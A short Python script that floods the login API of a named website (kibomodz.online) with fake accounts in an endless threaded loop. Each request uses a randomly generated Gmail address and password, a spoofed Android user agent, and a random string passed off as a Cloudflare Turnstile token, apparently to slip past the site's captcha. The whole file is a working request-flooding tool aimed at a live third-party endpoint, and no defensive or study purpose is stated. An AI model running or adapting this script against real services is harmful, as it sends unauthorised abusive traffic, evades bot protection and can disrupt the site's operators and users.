import requests
import threading
import random
import string
import time

def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
fk = generate_random_string(90)
print(fk)
def GenLogin():
    url = 'https://backend.kibomodz.online/api/users/login'
    an_agent = f'Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': an_agent,
        'Referer': 'https://kibomodz.online/auth/login'
    }
    data = {
        'email': generate_random_string(13) + "@gmail.com",
        'password': generate_random_string(10),
        "turnstileToken": fk
    }

    response = requests.post(url, headers=headers, json=data)
    print(response)

def rangeLogin():
    threads = []
    for i in range(2):
        thread = threading.Thread(target=GenLogin)
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(2, 4))

    for thread in threads:
        thread.join()


while True:
	rangeLogin()
